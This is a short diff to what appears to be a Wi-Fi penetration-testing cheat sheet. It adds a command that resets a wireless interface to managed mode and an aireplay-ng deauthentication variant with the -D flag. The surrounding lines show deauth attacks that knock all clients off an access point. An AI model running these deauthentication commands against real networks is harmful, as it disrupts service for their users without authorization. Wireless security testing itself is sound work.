@@ -18,6 +18,8 @@ First your interface must be set to monitor mode, some cards don't allow it.  Su
 
 ```sh
 iwconfig <interface> mode monitor
+# set back to managed
+iwconfig <interface> mode managed
 ```
 
 ### Scan MAC addresses
@@ -93,6 +95,8 @@ To force all clients to forcibly reauthenticate.
 aireplay-ng -0 0 -a00:14:6C:7E:40:80 -c FF:FF:FF:FF:FF:FF wlan1
 aireplay-ng -0 0 -a <AP-MAC> -c <Client-MAC-or-FF:-for-all> <interface>
 # FF:FF:FF:FF:FF:FF is the broadcast address which affects all clients
+aireplay-ng -0 0 -a <AP-MAC> -c <Client-MAC-or-FF:-for-all> <interface> -D
+# -D stops the process from trying to determine the channel
 ```
 
 - -0: switch for deauthentication
